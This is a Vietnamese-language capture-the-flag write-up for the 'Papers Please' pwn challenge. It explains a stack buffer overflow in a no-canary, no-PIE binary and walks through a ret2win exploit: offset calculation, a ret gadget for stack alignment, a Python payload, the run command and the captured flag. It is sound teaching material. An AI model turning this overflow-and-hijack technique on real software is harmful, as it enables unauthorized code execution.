# Papers Please — Pwn (Easy)

**Flag:** `H7CTF{b66621cc-c85c-4042-b908-0d3dd36a71e5}`
**Máy chủ mục tiêu:** `pwn.h7tex.com:42578`
**File cung cấp:** `checkpoint.zip` (1077085 B, sha256 `737ceea6...a209da0b`) bung ra chứa tệp `checkpoint` (định dạng ELF x86-64, kích thước 16344 B, sha256 `b04ebc61...`), đi kèm `libc.so.6`, trình nạp `ld-linux-x86-64.so.2` và file `README.txt`.
**Bối cảnh chạy:** Hệ điều hành Ubuntu 24.04, nhân thư viện glibc phiên bản 2.39-0ubuntu8.9.

## Đề bài

Trò chơi mô phỏng một trạm kiểm soát biên giới. Tên lính gác chặn cửa hạch sách hỏi tên bạn, dùng lệnh in (echo) cái tên đó vào nhật ký log, rồi phũ phàng phán một câu: "Access denied ... Turn back." (Từ chối truy cập... Quay xe đi.) trước khi lạnh lùng cắt xoẹt kết nối. 
Ở phía sau quầy gác, nằm im lìm một con dấu (chính là hàm cấp quyền). Khổ nỗi, lính gác không bao giờ tự tay với lấy con dấu đó đóng cho bất kỳ ai. Nhiệm vụ của ta là: Dùng vũ lực (hack) ép hệ thống phải tự tay cầm con dấu đó dập lên giấy và phun ra lá cờ (flag).

## Phân tích ban đầu

Đẩy tệp qua công cụ rọi `triage.cjs`, ta bóc tách được bản đồ:

| Thuộc tính | Hiện trạng | Kết luận (Hệ quả) |
| --- | --- | --- |
| Lõi kiến trúc | `ET_EXEC`, cờ PIE tắt (no PIE) | Địa chỉ không nhảy loạn xạ (base cố định). Chẳng cần mất công chọc dò rỉ (leak), địa chỉ các hàm đã bị đông cứng thành hằng số tuyệt đối. |
| Vệ sĩ Stack (canary) | Tắt lịm (Hàm `__stack_chk_fail` bốc hơi khỏi danh sách import) | Cho phép đè chà đạp lên địa chỉ trả về (return address) một cách vô tội vạ. |
| Vùng cấm thực thi (NX) | Bật | Bít cửa ném mã độc (shellcode) trực tiếp lên stack. Muốn chạy lệnh, phải đi ăn mày (tái sử dụng) các đoạn mã nhị phân có sẵn trong máy. |
| Danh mục Imports | `read fopen fgets printf puts setvbuf fflush fclose` | Điểm chí mạng: Lệnh đọc `read` hoàn toàn không quan tâm đến giới hạn kích thước của cái rổ đựng (buffer). |

Điểm danh 3 hàm nhân vật chính:

```text
Hàm main        @ 0x401302   Chạy setvbuf(stdout, NULL, _IONBF, 0); Gọi đàn em checkpoint.
Hàm checkpoint  @ 0x4012a4   Cắt ngăn xếp sub rsp,0x40 -> Xây một rổ chứa (buffer) 64 byte tại vị trí [rbp-0x40].
Hàm grant_access@ 0x401216   Nã fopen("/flag","r"); Hút dữ liệu fgets(buf,0x50); Hét lên printf("ACCESS GRANTED: %s").
```

Đúng như kịch bản, hàm `main` lờ tịt không bao giờ triệu gọi `grant_access`. Cái hàm `grant_access` này chính là con dấu của đề bài: nó sinh ra để tự động đập vỡ tệp `/flag` rồi khoe lõi cờ ra ngoài.

Lỗ hổng (bug) toạc ra ở hàm `checkpoint`:

```text
4012ce: lea   rax,[rbp-0x40]     ; Lôi cái buffer 64 byte ra
4012d2: mov   edx,0x100          ; Giao chỉ tiêu: Mày phải đọc 256 byte
4012df: call  read@plt           ; Chạy hàm read(0, buf, 256)
4012fa: call  printf@plt         ; Hét lên ("Access denied, %s. Turn back.", buf)
```

Nghịch lý rõ ràng: Dùng lệnh `read(0, buf, 0x100)` rót một dòng thác tận 256 byte vào cái cốc `buf` cọc cạch dung tích chỉ 64 byte. Khi không có vệ sĩ canary bảo kê, đây là một pha tràn bộ đệm (stack overflow) chuẩn chỉ giáo khoa thuần túy.

## Chuỗi khai thác

**Bước 1 - Lập bản đồ đo khoảng cách (offset) tới đích return address.** 
Cái rổ buffer toạ lạc tại `[rbp-0x40]` (chiếm 64 byte), sát vách nó là lưu trữ rbp (saved rbp) nằm tại `[rbp]` (chiếm 8 byte), và đích đến - địa chỉ trả về (return address) đang rình rập ngay tại `[rbp+8]`. Phép tính Offset = 64 + 8 = 72 byte. Dòng chảy của lệnh `read` cho phép xả tới 256 byte, tức là tha hồ đất rộng để thả payload.

**Bước 2 - Trò ma xó nắn thẳng ngăn xếp (stack alignment).** 
Luật thép của hệ điều hành (ABI) quy định cứng: ngay tại instruction (câu lệnh) mở màn của một hàm, con trỏ stack phải thỏa mãn đẳng thức `rsp % 16 == 8`.

- Đâm bổ thẳng vào hàm `grant_access` qua lệnh `leave; ret`: Lệnh `leave` sẽ đè con trỏ `rsp = rbp_checkpoint`, lệnh `pop rbp` hất tiếp con trỏ lên 8 bậc, chốt sổ lệnh `ret` hất thêm 8 bậc nữa. Hậu quả: `rsp = rbp_main + 8`. Quay nhìn hàm `main`, nó khởi động nhạt nhẽo chỉ bằng lệnh `push rbp` rồi call luôn, dẫn tới `rbp_main % 16 == 0`. Tổng hợp lại: Ta đâm sầm vào cổng `grant_access` với con trỏ `rsp % 16 == 0`, trượt đường rày 8 byte so với cái luật chuẩn mực.
- Cánh cửa `grant_access` có gọi bầy đàn `fopen`/`fgets`/`printf` thuộc thư viện glibc 2.39; lũ đàn em này có thói quen xài chiêu `movaps` trên ngăn xếp. Chúng sẽ vả thẳng mặt bằng lỗi `SIGSEGV` (sập hệ thống) ngay khi ngửi thấy mùi stack bị lệch.

Kế hoạch vá đường: Chèn một con dốc (gadget `ret`) để xê dịch con trỏ `rsp` trượt đi đúng 8 byte. Ứng cử viên sáng giá là `_fini @ 0x401334` (mang lõi: `endbr64; sub rsp,8; add rsp,8; ret`). Cục gadget này kéo trượt stack đúng 8 byte, lại khoác trên mình lớp áo bào mở đầu `endbr64`, bảo đảm nó lướt mượt qua các hàng rào phòng ngự phần cứng (nếu CPU có bật CET/IBT).

**Bước 3 - Lên nòng (payload).**

```python
OFFSET       = 72
GRANT_ACCESS = 0x401216
RET_SLIDE    = 0x401334

# Cấu trúc: [Đạn độn chèn đủ 72 byte] + [Đoạn dốc trượt stack] + [Cổng hàm cấp quyền]
payload = b"DANH.B23DCAT040".ljust(OFFSET, b"A") + p64(RET_SLIDE) + p64(GRANT_ACCESS)
```

Quả bom này cân nặng vỏn vẹn 88 byte, chui lọt thỏm qua cái trần 256 byte của ống xả `read`. Đặc biệt, chả phải lo ngay ngáy về chuyện dính ký tự cấm: hàm `read` vốn không ngán dấu kết thúc chuỗi `\0`, và cái phần râu ria của `printf` khi in ra gặp `\0` cũng chỉ tắt đài tạo ra một hiệu ứng phụ vô thưởng vô phạt.

**Bước 4 - Bấm nút.**

```bash
cd "H7CTF 2026 Quals/papers-please"
python exploit.py
```

Tiếng vọng từ hệ thống đổ về:

```text
=== Sparrow Freight border checkpoint ===
State your name for the log:
Access denied, DANH.B23DCAT040AAAA...4@. Turn back.
ACCESS GRANTED: H7CTF{b66621cc-c85c-4042-b908-0d3dd36a71e5}
```

**Bước 5 - Niêm phong cờ.** Dùng ngay lưỡi dao regex `H7CTF\{[^}\n]*\}` cắt gọt dòng dữ liệu dội ra từ cổng socket, rồi tống thẳng lá cờ (flag) nhốt vào file `flag.txt`.

## Flag
```text
H7CTF{b66621cc-c85c-4042-b908-0d3dd36a71e5}
```
